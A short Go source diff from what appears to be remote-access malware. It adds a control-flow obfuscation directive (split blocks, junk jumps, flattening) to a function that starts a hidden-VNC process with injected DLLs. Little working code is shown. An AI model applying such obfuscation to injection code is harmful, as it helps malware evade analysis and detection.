@@ -754,6 +754,7 @@ func calcDirSize(dir string) int64 {
 }
 
 func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) (uint32, error) {
+	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
 	}
